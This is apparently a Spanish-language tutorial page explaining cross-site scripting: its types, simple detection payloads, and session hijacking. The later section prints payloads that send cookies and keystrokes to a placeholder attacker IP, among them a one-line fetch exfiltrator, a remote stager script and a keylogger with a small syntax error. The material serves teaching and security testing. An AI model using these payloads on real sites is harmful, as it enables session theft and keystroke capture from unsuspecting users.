+++
title = 'XSS'
draft = false
description = "Explicación del concepto de XSS."
tags = ["XSS"]
showToc = true
math = true
+++

# Cross-Site Scripting
Una aplicación web normal funciona recibiendo código HTML del servidor y renderizándolo en el navegador del cliente. Si una aplicación web no valida ni limpia el input del usuario correctamente, el usuario puede introducir código js en un campo de input para que, cuando él mismo u otro usuario vea la página, ese código js se ejecute en su navegador.

> *Las vulnerabilidades XSS son muy comunes, pero no afectan al servidor directamente, sólo al cliente que las ejecuta.*

Aunque sólo afectan al lado del cliente y están limitadas al motor JS del navegador y al dominio del sitio vulnerable (no afectan al SO del cliente), pueden ser muy peligrosas. Mediante XSS, un atacante puede, por ejemplo, *robar cookies de sesión o tomar acciones en nombre de otro usuario.*

## Tipos de XSS
### Persistente
Si el payload XSS se guarda en el backend, p.ej, en una base de datos, y luego se muestra al visitar la página, tenemos un XSS persistente.

> Como ataque, este tipo es el más peligroso por el potencial de infección que tiene (véase el [samy worm](https://w.wiki/HJs9)). Basta con inyectar el código en una página, que el servidor lo guarde, y que ese código se ejecute en el navegador de los clientes cada vez que accedan a la página.
### Reflejado
Si el payload llega hasta el servidor backend y luego se nos devuelve tal cual sin ser filtrado o saneado, tendremos un caso de XSS reflejado.

Podemos distinguir entre este y el anterior porque, en este, al recargar la página, nuestro payload habrá desaparecido. 

> Este tipo puede usarse como ataque mandando a alguien un enlace a una página vulnerable que contenga nuestro payload. (Mediante phishing)
### Basado en DOM
A diferencia de los anteriores, este se procesa completamente en el navegador del usuario, sin pasar por el servidor backend. Esto puede hacer que las vulnerabilidades XSS basadas en DOM pasen completamente desapercibidas.

Aquí el problema está en alguna función javascript que toma un input inseguro y no lo valida, y que simplemente modifica el DOM (y la página) con él.
## Identificación de XSS
> *Un código XSS puede inyectarse en cualquier input de una página web siempre y cuando su valor/output se muestre en pantalla. Esto incluye tanto **formularios web** como **cabeceras HTTP (p.ej User-Agent o Cookie)***

Hay algunos inputs que podemos meter en formularios y headers para comprobar si son vulnerables a XSS.

El más básico:
```html
<script>alert(1)</script>
```

En el siguiente payload, `window.origin` indica la IP/Dominio del servidor web del que viene la página en que se ejecuta el código js. (Generalmente el dominio del servidor al que estamos conectados).
```html
<script>alert(window.origin)</script>
```
> Es preferible usar `alert(window.origin)` en lugar de, p.ej, `alert(1)`, porque, aunque es más largo, nos indica el dominio que realmente es vulnerable a XSS. Si estamos en dominio.com y encontramos una XSS, pero `window.origin` indica subd.dominio.com, no podremos robar cookies de dominio.com por la Same-Origin Policy.

Este payload abre el diálogo de impresión del navegador, algo que rara vez bloquearía un navegador:
```html
<script>print()</script>
```

Este muestra las cookies del scope actual (documento y dominio actual) que no tengan protecciones específicas contra javascript:
```html
<script>alert(document.cookie)</script>
```
> Este sirve solo como PoC del XSS, pues de poco le sirve al atacante ver su propia cookie de sesión (Si lo ejecutamos nosotros, veremos la alerta en nuestro navegador, si la ejecuta un administrador, la verá en el suyo). Pero, para robar cookies de forma útil luego, también se hace uso de `document.cookie` enviando el output por la red.

En el caso de que `<script>` no esté permitido, también podemos usar este:
```html
<img src="1" onerror=alert(window.origin)>
```

## Robo de Cookies (Session Hijacking).
El session hijacking es uno de los ataques más críticos que pueden hacerse mediante XSS. El proceso de ataque varía en función del tipo de XSS (Stored/Reflected/DOM) pero es bastante similar en todos los casos:
1. El atacante identifica un punto vulnerable a XSS
2. Se envía un payload que hace que el navegador del usuario tome las cookies guardadas y las mande a un servidor en escucha del atacante.
  - A través del servidor (Stored)
  - A través de un enlace malicioso (Reflected)
3. El navegador usa comandos como `document.cookie` y transmite las cookies al servidor del atacante.

#### **Stageless XSS**
En una línea, este sería un ejemplo de un ataque XSS que mande la cookie del navegador a nuestra IP:
```js
<script>fetch('http://IP_ATACANTE/?c=' + document.cookie)</script>
```

#### **Staged XSS**
Normalmente, para evitar tener que mandar un  payload muy largo que haga todo de una vez (y con posibles limitaciones de longitud, encoding o WAFs), se divide el trabajo en:
1. **Stager**: Una inyección XSS que hace que el navegador acceda al stage.
```javascript
<script src=http://IP_ATACANTE/stager.js></script>
```
2. **Stage**: Un código .js alojado en el servidor atacante (El payload real).

El staged XSS tiene el beneficio de permitirnos editar nuestro payload en directo aunque ya se haya inyectado el stager. Además, no solo sirve para robar cookies. Estos son algunos ejemplos de stager:

- Robo de cookies (Session hijacking)
```js
//stage.js
var cookies = document.cookie;
new Image().src = "http://IP_ATAC/index.php?c=" + cookies;
```

- Keylogger
```js
//script.js
document.onkeypress = function(e) {
    var key e.key;
    fetch("http://IP_ATAC/log?k=" + key);
};
```

Pueden usarse frameworks como [BeEF](https://beefproject.com/) que automatizan la creación de stages, requiriendo simplemente que el stager redirija hacia puntos en los que escucha.
